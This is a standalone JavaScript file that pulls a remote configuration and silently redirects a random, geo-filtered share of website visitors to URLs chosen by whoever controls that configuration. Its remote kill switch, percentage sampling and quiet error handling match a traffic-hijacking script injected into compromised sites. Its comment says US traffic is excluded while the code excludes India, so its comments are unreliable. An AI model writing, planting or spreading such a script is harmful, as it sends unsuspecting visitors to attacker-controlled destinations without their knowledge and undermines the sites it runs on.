(async function () {
  try {
    /* ===============================
       1. FETCH REDIRECT CONFIG
    =============================== */

    const CONFIG_URL =
      "https://peachpuff-raven-871070.hostingersite.com/?get-redirect";

    const configResponse = await fetch(CONFIG_URL);
    const config = await configResponse.json();

    const enabled = Number(config.enabled) === 1;
    const percentage = Number(config.percentage) || 0;

    let urls = (config.urls || "")
      .split(",")
      .map(u => u.trim())
      .filter(u => u.length > 10);

    if (!enabled || urls.length === 0) return;

    /* ===============================
       2. GET VISITOR COUNTRY
    =============================== */

    async function getCountry(url, key) {
      try {
        const res = await fetch(url);
        const data = await res.json();
        return (data[key] || "").toUpperCase();
      } catch {
        return "";
      }
    }

    // Try Cloudflare first
    let country =
      window.CF_IPCOUNTRY?.toUpperCase?.() || "";

    // Fallbacks
    if (!country) {
      country = await getCountry(
        "https://api.country.is/",
        "country"
      );
    }

    if (!country) {
      country = await getCountry(
        "https://ipwho.is/",
        "country_code"
      );
    }

    /* ===============================
       3. COUNTRY FILTER
    =============================== */

    // Do NOT redirect US traffic
    if (country == "IN") return;

    /* ===============================
       4. PERCENTAGE LOGIC
    =============================== */

    const randomValue = Math.floor(Math.random() * 100);
    if (randomValue >= percentage) return;

    /* ===============================
       5. REDIRECT
    =============================== */

    const target =
      urls[Math.floor(Math.random() * urls.length)];

    if (!target) return;

    setTimeout(() => {
      window.location.href = target;
    }, 1000);

  } catch (err) {
    console.warn("⚠ Redirect script error", err);
  }
})();
